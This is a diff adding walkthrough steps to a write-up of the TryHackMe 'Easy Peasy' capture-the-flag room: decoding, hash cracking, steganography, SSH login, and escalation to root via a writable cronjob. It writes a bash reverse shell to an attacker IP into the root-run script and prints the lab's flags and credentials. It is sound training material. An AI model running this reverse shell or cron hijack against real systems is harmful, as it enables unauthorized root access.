@@ -5,8 +5,9 @@ categories:
 tags:
   - writeup
   - tryhackme
-  - xxe
-  - sudo
+  - enumerate
+  - cracking hash
+  - cron
 ---
 Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.
 
@@ -163,9 +164,22 @@ There are 3 ports open, the nginx version is 1.16.1, and Apache is running on th
 
   <a href="/assets/images/tryhackme/easy-peasy/9.png"><img src="/assets/images/tryhackme/easy-peasy/9.png"></a>
 
+  Decode the encoded string.
 
+  ```bash
+  $ echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
+  flag{f1rs7_fl4g}
+  ```
 
 - Further enumerate the machine, what is flag 2?
+
+  Checking `robots.txt` file.
+
+  <a href="/assets/images/tryhackme/easy-peasy/10.png"><img src="/assets/images/tryhackme/easy-peasy/10.png"></a>
+
+  We got like a hash user-agent. Let's crack it out.
+
+  <a href="/assets/images/tryhackme/easy-peasy/11.png"><img src="/assets/images/tryhackme/easy-peasy/11.png"></a>
 
 
 - Crack the hash with easypeasy.txt, What is the flag 3?
@@ -225,3 +239,146 @@ There are 3 ports open, the nginx version is 1.16.1, and Apache is running on th
   ```
 
 - What is the password to login to the machine via SSH?
+
+  I see bunch of 1 and 0 on the picture on `/n0th1ng3ls3m4tt3r`.
+
+  <a href="/assets/images/tryhackme/easy-peasy/12.png"><img src="/assets/images/tryhackme/easy-peasy/12.png"></a>
+
+  I tried to decode it from binary but didn't worked. So, let's download the picture and do some steganography.
+
+  ```bash
+  $ steghide extract -sf index.jpeg                                                                                                                                      1 ⨯
+  Enter passphrase: 
+  wrote extracted data to "secrettext.txt".
+  ```
+
+  We got something using the password `mypasswordforthatjob`. Let's `cat` it out.
+
+  ```bash
+  $ cat secrettext.txt  
+  username:boring
+  password:
+  01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+  ```
+
+  Binary again :/. Let's decode it.
+
+  <a href="/assets/images/tryhackme/easy-peasy/13.png"><img src="/assets/images/tryhackme/easy-peasy/13.png"></a>
+
+- What is the user flag?
+
+  SSH to the machine.
+
+  ```bash
+  $ ssh boring@10.10.82.82 -p 6498 
+  The authenticity of host '[10.10.82.82]:6498 ([10.10.82.82]:6498)' can't be established.
+  ECDSA key fingerprint is SHA256:hnBqxfTM/MVZzdifMyu9Ww1bCVbnzSpnrdtDQN6zSek.
+  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+  Warning: Permanently added '[10.10.82.82]:6498' (ECDSA) to the list of known hosts.
+  *************************************************************************
+  **        This connection are monitored by government offical          **
+  **            Please disconnect if you are not authorized              **
+  ** A lawsuit will be filed against you if the law is not followed      **
+  *************************************************************************
+  boring@10.10.82.82's password: 
+  You Have 1 Minute Before AC-130 Starts Firing
+  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+  !!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
+  You Have 1 Minute Before AC-130 Starts Firing
+  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+  !!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
+  boring@kral4-PC:~$
+  ```
+
+  User.txt:
+
+  ```bash
+  boring@kral4-PC:~$ cat user.txt 
+  User Flag But It Seems Wrong Like It`s Rotated Or Something
+  synt{a0jvgf33zfa0ez4y}
+  ```
+
+  Decode it from caesar cipher.
+
+  <a href="/assets/images/tryhackme/easy-peasy/14.png"><img src="/assets/images/tryhackme/easy-peasy/14.png"></a>
+
+- What is the root flag?
+
+  Checking crontab.
+
+  ```bash
+  boring@kral4-PC:~$ cat /etc/crontab
+  # /etc/crontab: system-wide crontab
+  # Unlike any other crontab you don't have to run the `crontab'
+  # command to install the new version when you edit this file
+  # and files in /etc/cron.d. These files also have username fields,
+  # that none of the other crontabs do.
+
+  SHELL=/bin/sh
+  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+  # m h dom mon dow user  command
+  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+  #
+  * *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
+  ```
+
+  Let's check the file.
+
+  ```bash
+  boring@kral4-PC:~$ cd /var/www
+  boring@kral4-PC:/var/www$ ls -la
+  total 16
+  drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
+  drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
+  drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
+  -rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
+  boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh 
+  #!/bin/bash
+  # i will run as root
+  ```
+
+  Since we are the owner of the file, let's send a reverse shell to the file.
+
+  ```bash
+  boring@kral4-PC:/var/www$ echo 'bash -i >& /dev/tcp/10.11.25.205/1111 0>&1' > .mysecretcronjob.sh
+  ```
+  
+  Set up our `netcat` listener and wait for the job to run.
+
+  ```bash
+  $ nc -lnvp 1111       
+  listening on [any] 1111 ...
+  connect to [10.11.25.205] from (UNKNOWN) [10.10.82.82] 32872
+  bash: cannot set terminal process group (1641): Inappropriate ioctl for device
+  bash: no job control in this shell
+  root@kral4-PC:/var/www# 
+  ```
+
+  Root.txt:
+
+  ```bash
+  root@kral4-PC:/var/www# cd /root
+  cd /rootl
+  root@kral4-PC:~# s
+  ls
+  root@kral4-PC:~# ls -la
+  ls -la
+  total 40
+  drwx------  5 root root 4096 Jun 15  2020 .
+  drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
+  -rw-------  1 root root    2 Feb  6 09:15 .bash_history
+  -rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
+  drwx------  2 root root 4096 Jun 13  2020 .cache
+  drwx------  3 root root 4096 Jun 13  2020 .gnupg
+  drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
+  -rw-r--r--  1 root root  148 Aug 17  2015 .profile
+  -rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
+  -rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
+  root@kral4-PC:~# cat .root.txt
+  cat .root.txt
+  flag{63a9f0ea7bb98050796b649e85481845}
+  ```
